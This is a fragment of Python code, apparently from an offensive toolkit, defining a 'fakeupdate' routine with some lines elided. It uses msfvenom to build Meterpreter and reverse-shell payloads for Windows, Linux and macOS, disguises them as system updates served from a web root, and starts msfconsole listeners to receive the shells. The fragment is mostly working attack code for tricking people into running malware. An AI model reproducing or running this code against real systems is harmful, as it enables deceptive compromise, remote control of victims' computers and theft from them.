...
def fakeupdate():
    try:
        ...
        line_1 += " > "
        com = input(line_1)  # raw_input cambiado a input para Python 3
        com = com.lower()
        if com[0:13] == 'set interface':
            ...
            cmd_1 = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + options[1] + ' LPORT=4441 -f exe > /var/www/Windows-KB183905-ENU.exe'
            ...
            cmd_2 = 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + options[1] + ' LPORT=4442 -f elf > /var/www/Linux-update-EN-659'
            ...
            cmd_3 = 'msfvenom -p osx/x86/shell_reverse_tcp LHOST=' + options[1] + ' LPORT=4443 -f macho > /var/www/OSX-update-HT3131'
            ...
            windows_listener = 'xterm -e msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ' + options[1] + '; set LPORT 4441; exploit; exit -y" &'
            linux_listener = 'xterm -e msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST ' + options[1] + '; set LPORT 4442; exploit; exit -y" &'
            macosx_listener = 'xterm -e msfconsole -x "use exploit/multi/handler; set PAYLOAD osx/x86/shell_reverse_tcp; set LHOST ' + options[1] + '; set LPORT 4443; exploit; exit -y" &'
            ...
            enter_key = input(line_4)  # raw_input cambiado a input para Python 3
